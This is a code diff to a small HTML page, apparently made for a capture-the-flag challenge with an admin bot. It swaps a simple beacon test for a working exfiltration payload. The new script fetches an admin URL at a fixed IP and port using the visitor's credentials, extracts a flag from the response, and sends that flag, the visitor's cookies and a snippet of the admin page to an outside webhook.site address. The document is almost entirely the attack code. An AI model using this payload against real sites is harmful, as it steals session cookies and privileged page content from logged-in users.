@@ -2,18 +2,37 @@
 <html>
 <body>
 <script>
-  // SUPER SIMPLE - just send one request
-  console.log('Test page loaded by bot');
-  
-  // Method 1: Image tag (most reliable)
-  new Image().src = 'https://webhook.site/5a0bcea6-6223-4e18-8e0d-7759204334ab?test=success&time=' + Date.now();
-  
-  // Method 2: Backup fetch (in case image doesn't work)
-  setTimeout(function() {
-    fetch('https://webhook.site/5a0bcea6-6223-4e18-8e0d-7759204334ab?backup=true', {
-      mode: 'no-cors'
+  // Use the FULL admin URL with port
+  fetch('http://94.237.61.52:42667/admin', { 
+    credentials: 'include',
+    mode: 'cors'
+  })
+    .then(r => r.text())
+    .then(html => {
+      // Extract flag from h4 tag
+      const match = html.match(/<h4>([^<]+)<\/h4>/);
+      const flag = match ? match[1] : 'NOT_FOUND_IN_H4';
+      
+      // Also look for any flag pattern
+      const flagPattern = html.match(/flag{.*?}/i);
+      const foundFlag = flagPattern ? flagPattern[0] : flag;
+      
+      // Send flag to webhook
+      new Image().src = 'https://webhook.site/5a0bcea6-6223-4e18-8e0d-7759204334ab?flag=' + encodeURIComponent(foundFlag);
+      
+      // Send cookies too
+      new Image().src = 'https://webhook.site/5a0bcea6-6223-4e18-8e0d-7759204334ab?cookies=' + encodeURIComponent(document.cookie);
+      
+      // Send a snippet of the HTML for verification
+      fetch('https://webhook.site/5a0bcea6-6223-4e18-8e0d-7759204334ab', {
+        method: 'POST',
+        mode: 'no-cors',
+        body: 'ADMIN_PAGE_SNIPPET: ' + html.substring(0, 500)
+      });
+    })
+    .catch(err => {
+      new Image().src = 'https://webhook.site/5a0bcea6-6223-4e18-8e0d-7759204334ab?error=' + encodeURIComponent(err.message);
     });
-  }, 1000);
 </script>
 </body>
 </html>
